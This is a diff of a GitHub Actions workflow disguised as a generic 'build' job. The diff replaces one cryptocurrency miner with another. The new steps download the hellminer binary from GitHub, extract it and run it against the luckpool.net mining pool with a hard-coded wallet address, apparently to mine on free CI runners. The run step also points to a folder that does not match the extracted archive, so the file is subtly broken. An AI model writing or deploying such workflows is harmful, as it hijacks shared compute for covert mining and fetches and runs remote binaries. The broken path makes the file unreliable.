@@ -1,10 +1,10 @@
-name: eX-code_UMBL
+name: NAME
  
 on: [workflow_dispatch]
  
 jobs:
   build:
-    name: eX-code_UMBL
+    name: NAME
     runs-on: windows-latest
     strategy:
       max-parallel: 5
@@ -16,11 +16,11 @@ jobs:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
     steps:
-    - name: PREPARING
-      run: Invoke-WebRequest https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-win64.zip -Outfile XLArig-v5.2.2-win64.zip
-    - name: Seting-UP
-      run: Expand-Archive XLArig-v5.2.2-win64.zip
-    - name: Running
-      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o stratum+tcp://na.luckpool.net:3956#xnsub -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u TRX:RPGnF741xxs1dwUTqrWhKTkTjdXSRPmGrK.tuyulVIP
+    - name: DOWNLOAD
+      run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_win64_avx.zip -OutFile hellminer_cpu_win64_avx.zip
+    - name: Extract
+      run: Expand-Archive hellminer_cpu_win64_avx.zip
+    - name: RUNNING
+      run: .\xmrig-6.15.0-gcc-win64\hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RPGnF741xxs1dwUTqrWhKTkTjdXSRPmGrK.tuyulVIP -p x --cpu 2
     - name: DONE
       run: exit
